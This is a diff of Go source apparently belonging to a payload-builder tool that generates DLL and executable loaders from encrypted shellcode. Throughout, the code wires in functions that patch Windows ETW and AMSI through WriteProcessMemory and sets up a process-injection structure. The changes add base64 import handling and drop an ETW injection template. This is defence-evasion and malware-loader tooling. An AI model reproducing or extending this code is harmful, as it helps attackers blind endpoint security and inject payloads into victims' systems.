@@ -387,9 +387,11 @@ func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, ref
 		ETW_Function, ETW := ETW_Buff(b64number, DLL.Variables["decode"], DLL.Variables["WriteProcessMemory"])
 		DLL.Variables["ETW"] = ETW + "()"
 		DLL.Variables["ETW_Function"] = ETW_Function
+		DLL.Variables["B64"] = `"encoding/base64"`
 	} else {
 		DLL.Variables["ETW"] = ""
 		DLL.Variables["ETW_Function"] = ""
+		DLL.Variables["B64"] = ``
 	}
 	if AMSI == false {
 		AMSI_Function, AMSI := AMSI_Buff(DLL.Variables["WriteProcessMemory"])
@@ -402,7 +404,8 @@ func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, ref
 	}
 
 	if ETW == false || AMSI == false {
-		DLL.Variables["HEX_Import"] = `"encoding/hex"`
+		DLL.Variables["HEX_Import"] = `"encoding/hex"
+		"encoding/base64"`
 	} else {
 		DLL.Variables["HEX_Import"] = ``
 	}
@@ -756,9 +759,11 @@ func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, 
 		ETW_Function, ETW := ETW_Buff(b64number, Binary.Variables["decode"], Binary.Variables["WriteProcessMemory"])
 		Binary.Variables["ETW"] = ETW + "()"
 		Binary.Variables["ETW_Function"] = ETW_Function
+		Binary.Variables["B64"] = `"encoding/base64"`
 	} else {
 		Binary.Variables["ETW"] = ""
 		Binary.Variables["ETW_Function"] = ""
+		Binary.Variables["B64"] = ``
 	}
 	if AMSI == false {
 		AMSI_Function, AMSI := AMSI_Buff(Binary.Variables["WriteProcessMemory"])
@@ -783,19 +788,6 @@ func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, 
 		Binary.Variables["offset"] = Cryptor.VarNumberLength(4, 9)
 		Binary.Variables["datalength"] = Cryptor.VarNumberLength(4, 9)
 		Structure = Struct.Procces_Injection()
-		if ETW == false {
-			ETWInjectionTemplate, err := template.New("Binary").Parse(Struct.ETWInjectionSection())
-			if err != nil {
-				log.Fatal(err)
-			}
-			if err := ETWInjectionTemplate.Execute(&buffer, Binary); err != nil {
-				log.Fatal(err)
-			}
-			Binary.Variables["ETWInjectionSection"] = buffer.String()
-			buffer.Reset()
-		} else {
-			Binary.Variables["ETWInjectionSection"] = ""
-		}
 
 	} else {
 		Structure = Struct.Binary()
